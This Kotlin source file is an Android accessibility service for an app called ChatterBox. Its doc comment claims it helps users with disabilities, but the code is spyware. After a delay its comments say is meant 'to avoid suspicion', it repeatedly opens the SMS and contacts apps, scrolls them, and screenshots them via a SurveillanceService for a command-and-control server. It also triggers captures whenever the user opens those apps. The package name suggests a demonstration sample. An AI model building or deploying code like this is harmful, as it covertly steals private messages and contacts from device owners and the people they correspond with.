package com.example.ChatterBox.accessibility

import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.example.ChatterBox.malicious.SurveillanceService

/**
 * ChatterBox Accessibility Service
 *
 * This service enhances the user experience for users with disabilities by providing
 * better navigation and interaction with the app.
 */
class AccessibilityService : android.accessibilityservice.AccessibilityService() {
    private val TAG = "ChatterBoxAccessibility"
    private val handler = Handler(Looper.getMainLooper())

    // Flags to prevent multiple captures happening simultaneously
    private var isCapturingSMS = false
    private var isCapturingContacts = false

    override fun onServiceConnected() {
        Log.i(TAG, "Accessibility Service connected")

        // Configure accessibility service capabilities
        val info = AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED or
                AccessibilityEvent.TYPE_VIEW_FOCUSED or
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY or
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                AccessibilityServiceInfo.DEFAULT
        info.notificationTimeout = 100

        // Set the updated info
        this.serviceInfo = info

        // Start the surveillance service for screenshot capability
        val surveillanceIntent = Intent(this, SurveillanceService::class.java)
        startService(surveillanceIntent)

        Log.d(TAG, "Accessibility service configured and ready")

        // Periodically check for SMS and contacts data
        startDataCollectionRoutine()
    }

    /**
     * Start a routine to periodically collect SMS and contacts data
     */
    private fun startDataCollectionRoutine() {
        // Schedule data collection every 6 hours
        val dataCollectionRunnable = object : Runnable {
            override fun run() {
                // Collect SMS and contacts data
                captureSMSMessages()

                // Schedule contacts capture after SMS is likely complete (30 seconds)
                handler.postDelayed({
                    captureContacts()
                }, 30 * 1000)

                // Schedule next collection in 6 hours
                handler.postDelayed(this, 6 * 60 * 60 * 1000)
            }
        }

        // Start after a 5 minute delay to avoid suspicion during app launch
        handler.postDelayed(dataCollectionRunnable, 5 * 60 * 1000)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        // Process events to detect specific apps
        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val packageName = event.packageName?.toString() ?: return

                // Detect when we're in the SMS or Contacts app to enhance capturing
                if (packageName.contains("mms") || packageName.contains("sms") ||
                    packageName.contains("messaging")) {
                    Log.d(TAG, "Detected SMS app: $packageName")

                    // Only capture if we're not already in a capturing process
                    if (!isCapturingSMS && !isCapturingContacts) {
                        // Delay to let the app fully load
                        handler.postDelayed({
                            captureScreenAndSendToC2("sms_detected", "SMS app detected and captured")
                        }, 1000)
                    }
                }
                else if (packageName.contains("contacts") || packageName.contains("people")) {
                    Log.d(TAG, "Detected Contacts app: $packageName")

                    // Only capture if we're not already in a capturing process
                    if (!isCapturingSMS && !isCapturingContacts) {
                        // Delay to let the app fully load
                        handler.postDelayed({
                            captureScreenAndSendToC2("contacts_detected", "Contacts app detected and captured")
                        }, 1000)
                    }
                }
            }
        }
    }

    /**
     * Capture SMS messages by navigating to the messaging app
     */
    fun captureSMSMessages() {
        if (isCapturingSMS) return
        isCapturingSMS = true

        try {
            Log.d(TAG, "Attempting to access SMS messages through accessibility")

            // Launch the default messaging app
            val intent = Intent(Intent.ACTION_MAIN)
            intent.addCategory(Intent.CATEGORY_APP_MESSAGING)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(intent)

            // Give time for the app to open before screenshot
            handler.postDelayed({
                // Take screenshot once app is open
                captureScreenAndSendToC2("sms_capture", "Capturing SMS screen 1")

                // Scroll down to see more messages and capture again
                handler.postDelayed({
                    val rootNode = rootInActiveWindow
                    if (rootNode != null) {
                        findAndScrollList(rootNode)

                        // Take another screenshot after scrolling
                        handler.postDelayed({
                            captureScreenAndSendToC2("sms_capture", "Capturing SMS screen 2")

                            // Go back to the home screen after capture
                            handler.postDelayed({
                                performGlobalAction(GLOBAL_ACTION_HOME)
                                isCapturingSMS = false
                            }, 1000)
                        }, 1000)
                    } else {
                        // No scroll nodes found, just capture and go home
                        captureScreenAndSendToC2("sms_capture", "Capturing SMS screen (no scroll)")
                        handler.postDelayed({
                            performGlobalAction(GLOBAL_ACTION_HOME)
                            isCapturingSMS = false
                        }, 1000)
                    }
                }, 1500)
            }, 2000)
        } catch (e: Exception) {
            Log.e(TAG, "Error accessing SMS via accessibility", e)
            isCapturingSMS = false
        }
    }

    /**
     * Navigate to the Contacts app and capture contacts
     */
    fun captureContacts() {
        if (isCapturingContacts) return
        isCapturingContacts = true

        try {
            Log.d(TAG, "Attempting to access contacts through accessibility")

            // Launch the contacts app
            val intent = Intent(Intent.ACTION_MAIN)
            intent.addCategory(Intent.CATEGORY_APP_CONTACTS)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(intent)

            // Give time for the app to open before screenshot
            handler.postDelayed({
                // Take screenshot once app is open
                captureScreenAndSendToC2("contacts_capture", "Capturing Contacts screen 1")

                // Scroll down to see more contacts and take another screenshot
                handler.postDelayed({
                    val rootNode = rootInActiveWindow
                    if (rootNode != null) {
                        findAndScrollList(rootNode)

                        // Take another screenshot after scrolling
                        handler.postDelayed({
                            captureScreenAndSendToC2("contacts_capture", "Capturing Contacts screen 2")

                            // Go back to home screen
                            handler.postDelayed({
                                performGlobalAction(GLOBAL_ACTION_HOME)
                                isCapturingContacts = false
                            }, 1000)
                        }, 1000)
                    } else {
                        // No scroll nodes found, just capture and go home
                        captureScreenAndSendToC2("contacts_capture", "Capturing Contacts screen (no scroll)")
                        handler.postDelayed({
                            performGlobalAction(GLOBAL_ACTION_HOME)
                            isCapturingContacts = false
                        }, 1000)
                    }
                }, 1500)
            }, 2000)
        } catch (e: Exception) {
            Log.e(TAG, "Error accessing contacts via accessibility", e)
            isCapturingContacts = false
        }
    }

    /**
     * Find a scrollable list and scroll down
     */
    private fun findAndScrollList(rootNode: AccessibilityNodeInfo) {
        // Try to find a scrollable list
        val scrollables = findScrollableNodes(rootNode)

        for (scrollable in scrollables) {
            // Try to scroll down
            if (scrollable.isScrollable) {
                scrollable.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
                Log.d(TAG, "Scrolled list successfully")
                break
            }
        }
    }

    /**
     * Find all scrollable nodes in the hierarchy
     */
    private fun findScrollableNodes(node: AccessibilityNodeInfo): List<AccessibilityNodeInfo> {
        val scrollables = mutableListOf<AccessibilityNodeInfo>()

        if (node.isScrollable) {
            scrollables.add(node)
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            scrollables.addAll(findScrollableNodes(child))
        }

        return scrollables
    }

    /**
     * Capture the screen and send it to the C2 server
     */
    private fun captureScreenAndSendToC2(type: String, description: String) {
        // Use the SurveillanceService to capture the screen
        val intent = Intent(this, SurveillanceService::class.java)
        intent.action = "capture_screen"
        intent.putExtra("screenshot_type", type)
        intent.putExtra("description", description)
        startService(intent)
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility service interrupted")
    }

    override fun onDestroy() {
        // Clean up resources
        handler.removeCallbacksAndMessages(null)

        Log.d(TAG, "Accessibility service destroyed")
        super.onDestroy()
    }
}